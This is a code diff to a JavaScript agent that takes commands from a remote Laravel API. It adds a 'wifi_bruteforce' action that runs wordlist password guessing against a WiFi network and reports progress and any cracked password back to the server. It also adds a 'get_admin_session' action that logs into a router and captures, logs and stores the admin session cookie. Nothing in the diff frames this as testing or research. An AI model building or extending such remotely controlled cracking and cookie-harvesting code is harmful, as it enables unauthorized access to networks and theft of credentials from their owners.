@@ -714,7 +714,59 @@ class StatusReporter {
       });
       console.log(`[report] Session status: ${status}`);
     } catch (err) {
-      console.error(`[report] Failed to report session status: ${err.message}`);
+      console.error(`[report] Failed to report session status:`, err.message);
+    }
+  }
+
+  async reportBruteForceResult(logId, result) {
+    try {
+      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/complete`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
+        },
+        body: JSON.stringify({
+          session_id: logId,
+          found: result.found,
+          attempts: result.attempts,
+          elapsed: result.elapsed,
+          error: result.error || null,
+        }),
+      });
+      console.log(`[report] Brute-force complete posted`);
+    } catch (err) {
+      console.error(`[report] Failed to report brute-force complete:`, err.message);
+    }
+  }
+
+  async reportBruteForceProgress(sessionId, data) {
+    try {
+      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/progress`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
+        },
+        body: JSON.stringify({ session_id: sessionId, ...data }),
+      });
+    } catch (err) {
+      console.error(`[report] Failed to report brute-force progress:`, err.message);
+    }
+  }
+
+  async reportBruteForceFound(sessionId, data) {
+    try {
+      await fetch(`${CONFIG.LARAVEL_API_URL}/router/bruteforce/found`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.LARAVEL_API_TOKEN}`,
+        },
+        body: JSON.stringify({ session_id: sessionId, ...data }),
+      });
+    } catch (err) {
+      console.error(`[report] Failed to report brute-force found:`, err.message);
     }
   }
 }
@@ -779,8 +831,8 @@ class Agent {
     const automation = require('./router/automation');
     const page = await this.connection.getRouterPage();
     try {
-      // Skip login for network diagnostic (we switch away from the router)
-      if (data.action !== 'diagnose_network') {
+      // Skip login for actions that don't need a router browser session
+      if (data.action !== 'diagnose_network' && data.action !== 'wifi_bruteforce') {
         const sessionValid = await automation.isLoggedIn(page);
         await this.reporter.reportSessionStatus(sessionValid ? 'active' : 'expired');
         if (!sessionValid) {
@@ -819,9 +871,37 @@ class Agent {
           await this.reporter.reportSessionStatus('active');
           console.log('[check_session] Session is active — logged in successfully');
           break;
+        case 'get_admin_session':
+          const sessionCookie = await automation.loginAndGetSessionToken(
+            page,
+            data.parameters?.username,
+            data.parameters?.password,
+            {
+              showPassword: data.parameters?.show_password !== false,
+              demoReuse:    data.parameters?.demo_reuse !== false,
+            }
+          );
+          console.log(`[admin_session] Cookie obtained: ${sessionCookie.substring(0, 50)}...`);
+          // Save cookie to state so other actions can reuse it
+          this.state.update({ sessionCookie, lastSessionFetch: new Date().toISOString() });
+          await this.reporter.reportSessionStatus('active');
+          break;
         case 'diagnose_network':
           const diagResult = await this.executeDiagnoseNetwork(page, data);
           await this.reporter.reportDiagnoseResult(data.log_id, diagResult);
+          break;
+        case 'wifi_bruteforce':
+          const bfResult = await this.executeWifiBruteForce(data);
+          const bfSessionId = data.parameters?.session_id;
+          if (bfSessionId) {
+            await this.reporter.reportBruteForceResult(bfSessionId, bfResult);
+          }
+          break;
+        case 'stop_bruteforce':
+          if (this._bfAbortController) {
+            this._bfAbortController.abort();
+            console.log('[agent] Brute-force abort signal sent');
+          }
           break;
         default:
           throw new Error(`Unknown action: ${data.action}`);
@@ -986,6 +1066,44 @@ class Agent {
       return result;
     } finally {
       await diagPage.close().catch(() => {});
+    }
+  }
+
+  async executeWifiBruteForce(data) {
+    const automation = require('./router/automation');
+    const params = data.parameters || {};
+    const wordlistFile = params.wordlist || null;
+    const passwords = params.passwords || null;
+    const ssid = params.ssid || null;
+    const sessionId = params.session_id || null;
+
+    console.log(`[wifi_bruteforce] Starting brute-force (wordlist: ${wordlistFile || 'built-in'}, SSID: ${ssid || 'default'}, session: ${sessionId})`);
+
+    const abortController = new AbortController();
+    this._bfAbortController = abortController;
+
+    try {
+      const result = await automation.executeWifiBruteForce({
+        passwords,
+        wordlistFile,
+        ssid,
+        signal: abortController.signal,
+        onProgress: (p) => {
+          console.log(`[wifi_bruteforce] Progress: ${p.attemptsDone}/${p.total} | ${p.password} -> ${p.state} | ${p.rate}/min | ETA ~${p.eta}min`);
+          if (sessionId) {
+            this.reporter.reportBruteForceProgress(sessionId, p);
+          }
+        },
+        onFound: (f) => {
+          console.log(`[wifi_bruteforce] FOUND: "${f.password}" IP: ${f.ip}`);
+          if (sessionId) {
+            this.reporter.reportBruteForceFound(sessionId, f);
+          }
+        },
+      });
+      return result;
+    } finally {
+      this._bfAbortController = null;
     }
   }
 
